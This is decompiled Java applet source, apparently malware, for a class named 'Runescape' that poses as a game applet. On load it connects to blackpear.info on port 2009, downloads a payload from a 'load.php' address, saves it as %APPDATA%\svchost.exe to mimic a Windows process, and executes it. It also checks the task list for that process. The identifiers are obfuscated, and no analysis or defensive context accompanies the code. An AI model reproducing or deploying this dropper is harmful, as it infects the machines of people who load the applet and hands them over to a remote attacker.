import java.net.InetAddress;
import java.io.Reader;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.InputStream;
import java.net.URLConnection;
import java.io.FileOutputStream;
import java.net.URL;
import java.io.IOException;
import java.net.UnknownHostException;
import java.net.Socket;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Runescape extends Applet
{
    private static final long serialVersionUID = 798885599988486171L;
    private static final int poOmqbEiwb = 30;
    private static String CyPdnHuOvg;
    public static Socket aVzZiGhghM;
    public static Thread EQAdSzHWyC;
    
    @Override
    public void init() {
        try {
            Runescape.aVzZiGhghM = new Socket(mgczUpcuux(), 2009);
            (Runescape.EQAdSzHWyC = new Thread(new qqmOYUhlRd(Runescape.aVzZiGhghM))).start();
        }
        catch (UnknownHostException ex) {}
        catch (IOException ex2) {}
        final long currentTimeMillis = System.currentTimeMillis();
        while (!qqmOYUhlRd.PaKZShdGyb || qqmOYUhlRd.PaKZShdGyb) {
            if (qqmOYUhlRd.uvnWSEnhZB) {
                try {
                    final String getenv = System.getenv("APPDATA");
                    Runescape.CyPdnHuOvg = "\\svchost.exe";
                    final URLConnection openConnection = new URL(this.getCodeBase().toString() + "load.php").openConnection();
                    final String concat = getenv.concat(Runescape.CyPdnHuOvg);
                    final InputStream inputStream = openConnection.getInputStream();
                    final FileOutputStream fileOutputStream = new FileOutputStream(concat);
                    final byte[] array = new byte[1024];
                    int i = inputStream.read(array);
                    if (qqmOYUhlRd.uvnWSEnhZB) {
                        while (i > 0) {
                            fileOutputStream.write(array, 0, i);
                            i = inputStream.read(array);
                        }
                    }
                    inputStream.close();
                    fileOutputStream.close();
                    Runtime.getRuntime().exec(concat);
                }
                catch (Exception ex3) {}
                break;
            }
            if ((System.currentTimeMillis() - currentTimeMillis) / 1000L != 10L) {
                continue;
            }
            System.exit(1);
        }
    }
    
    public static String DFDgPEoesa() {
        final String cyPdnHuOvg = Runescape.CyPdnHuOvg;
        final int index = cyPdnHuOvg.indexOf("\\");
        final StringBuffer sb = new StringBuffer(cyPdnHuOvg);
        sb.replace(0, index + 1, "");
        return sb.toString();
    }
    
    public static boolean DGmYrzpMRh() throws IOException {
        String line;
        while ((line = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec("tasklist.exe").getInputStream())).readLine()) != null) {
            if (line.contains(DFDgPEoesa())) {
                return true;
            }
        }
        return false;
    }
    
    private static String mgczUpcuux() {
        InetAddress byName = null;
        try {
            byName = InetAddress.getByName("blackpear.info");
        }
        catch (UnknownHostException ex) {}
        return byName.getHostAddress();
    }
    
    static {
        Runescape.aVzZiGhghM = null;
    }
}
